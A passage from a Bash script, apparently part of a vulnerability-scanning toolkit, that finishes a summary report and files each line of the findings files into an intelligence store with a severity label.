  $(count_lines "${dir}/advanced_vulns/oauth/findings.txt") potential vulnerabilities

═══════════════════════════════════════════════════════════════════════════════

CRITICAL FINDINGS (REVIEW IMMEDIATELY):
$(cat "${dir}/advanced_vulns/"*/findings.txt 2>/dev/null | grep -i "POTENTIAL" | head -20 || echo "None")

Detailed results in ${dir}/advanced_vulns/
EOF
    
    # Store in intelligence database
    if type -t intel_store &>/dev/null; then
        for vuln_file in "${dir}/advanced_vulns/"*/findings.txt; do
            [[ -f "$vuln_file" ]] || continue
            local category=$(basename "$(dirname "$vuln_file")")
            
            while IFS= read -r finding; do
                [[ -z "$finding" ]] && continue
                local severity="medium"
                [[ "$finding" == *"CRITICAL"* ]] && severity="critical"
                [[ "$finding" == *"POTENTIAL"* ]] && severity="high"
                [[ "$finding" == *"INFO"* ]] && severity="info"
                
                intel_store "vulnerability" "$domain" "$finding" "$category" 70 "$severity" "advanced_vulns"
            done < "$vuln_file"
        done
    fi
    
    log_success "Advanced vulnerability aggregation completed"
}
